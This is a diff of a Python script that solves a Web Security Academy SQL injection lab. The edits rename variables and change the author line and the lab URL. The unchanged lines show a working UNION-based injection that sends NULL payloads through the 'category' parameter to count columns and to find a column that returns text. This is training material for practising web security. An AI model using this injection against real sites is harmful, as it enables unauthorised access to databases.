@@ -1,6 +1,6 @@
 #########################################################################################
 #
-# Author: Ahmed Elqalawii
+# Author: Ahmed Elqalawy (@elqal3awii)
 #
 # Date: 18/9/2023
 #
@@ -28,7 +28,7 @@ import re
 # Main
 #########
 # change this url to your lab
-url = "https://0aff002304ab6a08827a01340095007a.web-security-academy.net"
+url = "https://0a4900e60381dad984c0b585000f00c3.web-security-academy.net"
 print(Fore.BLUE + "[#] Injection parameter: " + Fore.YELLOW + "category")
 try:  # fetch the home page
     home = requests.get(url)
@@ -45,13 +45,13 @@ try:  # fetch the home page
             payload = f"' UNION SELECT {nulls}-- -".replace(", -- -", "-- -") # remove the last comma
             print(Fore.WHITE + f"[*] Trying payload: {payload}")
             # fetch the page with the injected payload
-            null_injection = requests.get(
+            injection = requests.get(
                 f"{url}/filter?category={payload}")
             # extract the error text
-            internal_error = re.findall("<h4>Internal Server Error</h4>",
-                                        null_injection.text)
+            internal_error_text = re.findall("<h4>Internal Server Error</h4>",
+                                        injection.text)
             # if the response is successful with no error text
-            if len(internal_error) == 0:
+            if len(internal_error_text) == 0:
                 print(Fore.WHITE +
                       "[#] Number of columns: " + Fore.GREEN + str(i))
                 # test every column with a text to determine the column conaining text
@@ -64,13 +64,13 @@ try:  # fetch the home page
                     print(Fore.WHITE + f"[*] Trying payload: {new_payload}")
                     try:
                         # fetch the page with the new injected payload
-                        text_null_injection = requests.get(
+                        injection = requests.get(
                             f"{url}/filter?category={new_payload}")
                         # extract the error text
-                        internal_error = re.findall("<h4>Internal Server Error</h4>",
-                                                    text_null_injection.text)
+                        internal_error_text = re.findall("<h4>Internal Server Error</h4>",
+                                                    injection.text)
                         # if the response is successful with no error text
-                        if len(internal_error) == 0:
+                        if len(internal_error_text) == 0:
                             print(Fore.WHITE +
                                   "[#] the column containing text: " + Fore.GREEN + str(j))
                             print(
